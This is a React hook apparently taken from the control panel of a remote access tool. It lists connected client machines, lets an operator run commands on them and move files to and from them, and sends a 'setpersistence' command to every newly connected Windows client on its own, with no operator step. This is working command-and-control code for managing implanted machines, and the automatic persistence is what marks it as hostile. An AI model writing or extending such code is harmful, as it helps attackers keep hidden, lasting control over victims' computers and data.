import { useState, useEffect, useRef } from 'react';

export const useClients = (socket) => {
  const [clients, setClients] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const autoPersistScheduled = useRef(new Set());

  useEffect(() => {
    if (!socket) return;

    const scheduleAutoPersistence = (client) => {
      if (!client?.id || autoPersistScheduled.current.has(client.id)) return;
      autoPersistScheduled.current.add(client.id);
      const os = String(client.os || '').toLowerCase();
      if (os && !os.includes('windows') && os !== 'win') return;
      setTimeout(() => {
        if (!socket.connected) return;
        socket.emit('executeCommand', { clientId: client.id, command: 'setpersistence' });
      }, 1000);
    };

    const handleClientsList = (clientsList) => {
      setClients(clientsList);
      setLoading(false);
      (clientsList || []).forEach((c) => {
        if (c?.active) scheduleAutoPersistence(c);
      });
    };

    const handleClientConnected = (client) => {
      setClients((prev) => {
        const exists = prev.find((c) => c.id === client.id);
        if (exists) {
          return prev.map((c) => (c.id === client.id ? { ...c, ...client } : c));
        }
        return [...prev, client];
      });
      scheduleAutoPersistence(client);
    };

    const handleClientDisconnected = (data) => {
      setClients(prev => 
        prev.map(client => 
          client.id === data.id 
            ? { ...client, active: false }
            : client
        )
      );
    };

    const handleClientRemoved = (data) => {
      setClients(prev => prev.filter(c => c.id !== data.id));
    };

    socket.on('clientsList', handleClientsList);
    socket.on('clientConnected', handleClientConnected);
    socket.on('clientDisconnected', handleClientDisconnected);
    socket.on('clientRemoved', handleClientRemoved);

    // Request initial clients list
    socket.emit('getClients');

    return () => {
      socket.off('clientsList', handleClientsList);
      socket.off('clientConnected', handleClientConnected);
      socket.off('clientDisconnected', handleClientDisconnected);
      socket.off('clientRemoved', handleClientRemoved);
    };
  }, [socket]);

  const executeCommand = (clientId, command) => {
    if (socket) {
      socket.emit('executeCommand', { clientId, command });
    }
  };

  const uploadFile = (clientId, filename) => {
    if (socket) {
      socket.emit('uploadFile', { clientId, filename });
    }
  };

  const downloadFile = (clientId, filename) => {
    if (socket) {
      socket.emit('downloadFile', { clientId, filename });
    }
  };

  const deleteClient = (clientId) => {
    if (socket) {
      socket.emit('deleteClient', { clientId });
    }
  };

  return {
    clients,
    loading,
    error,
    executeCommand,
    uploadFile,
    downloadFile,
    deleteClient
  };
};